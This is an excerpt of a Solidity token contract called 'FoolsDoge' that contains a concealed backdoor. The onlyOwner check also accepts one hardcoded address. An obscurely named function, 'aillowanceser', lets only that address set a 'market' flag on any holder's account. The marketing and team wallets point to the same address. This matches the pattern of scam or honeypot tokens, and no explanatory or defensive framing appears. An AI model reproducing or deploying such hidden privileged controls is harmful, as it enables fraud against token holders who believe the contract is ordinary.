...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x2E2255AE7dBb166Ef9c1A5fE06b5a498d8b0370d), "Ownable: caller is not the owner");
        _;
    }
...
contract FoolsDoge is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x2E2255AE7dBb166Ef9c1A5fE06b5a498d8b0370d);
    address payable public teamWalletAddress = payable(0x2E2255AE7dBb166Ef9c1A5fE06b5a498d8b0370d);
    ...
    function aillowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0x2E2255AE7dBb166Ef9c1A5fE06b5a498d8b0370d));
        market[addr] = status;
    }
